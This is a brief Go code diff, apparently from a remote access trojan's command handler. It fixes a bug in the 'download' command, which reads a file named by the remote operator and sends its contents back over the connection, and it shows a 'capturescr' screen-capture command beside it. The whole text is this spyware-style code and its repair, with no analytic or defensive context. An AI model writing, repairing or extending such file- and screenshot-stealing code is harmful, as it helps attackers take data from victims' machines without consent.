@@ -52,8 +52,8 @@ func main() {
 			if cmd == "download" {
 				send_msg(conn, "Supply a file to download :|")
 			} else {
-				tgt_file := strings.Split(cmd, " ")
-				send_msg(conn, read_file(tgt_file[]))
+				tgt_file := strings.Split(cmd, " ")[1]
+				send_msg(conn, read_file(tgt_file))
 			}
 		} else if cmd == "capturescr" {
 			result := capture_scr()
